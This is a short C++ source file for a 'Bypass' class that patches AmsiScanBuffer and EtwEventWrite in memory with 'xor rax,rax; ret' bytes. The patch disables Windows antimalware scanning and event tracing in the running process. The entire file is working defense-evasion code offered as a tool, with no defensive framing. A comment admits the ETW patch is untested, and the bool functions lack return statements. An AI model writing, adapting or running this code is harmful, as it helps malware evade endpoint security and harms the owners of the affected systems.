#include "Bypass.h"

void Bypass::WriteMem(FARPROC addr, Patch patch) {
	HANDLE currentProcessHandle = GetCurrentProcess();
	SIZE_T rBytes;

	WriteProcessMemory(currentProcessHandle, (LPVOID)addr, patch.patchBytes.data(), patch.size, &rBytes);
}

bool Bypass::PatchAMSI() {
	FARPROC addr = GetAddr("amsi.dll", "AmsiScanBuffer");
	Patch amsi;

	std::cout << "AmsiScanBuffer Address: " << addr << std::endl;

	amsi.size = 4;// x64
	amsi.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64
		
	WriteMem(addr, amsi);
}

bool Bypass::PatchETW() {// test this.
	FARPROC addr = GetAddr("ntdll.dll", "EtwEventWrite");
	Patch ETW;

	std::cout << "EtwEventWrite Address: " << addr << std::endl;

	// @TODO actaully test that this patch works, currently it's just an assumption.

	ETW.size = 4;
	ETW.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64

	WriteMem(addr, ETW);
}

FARPROC Bypass::GetAddr(std::string dllName, std::string fName){
	// @TODO change this to manually loading dll's
	HMODULE DLLHandle = LoadLibraryA(dllName.c_str());
	FARPROC functionAddress = GetProcAddress(DLLHandle, fName.c_str());

	return functionAddress;
}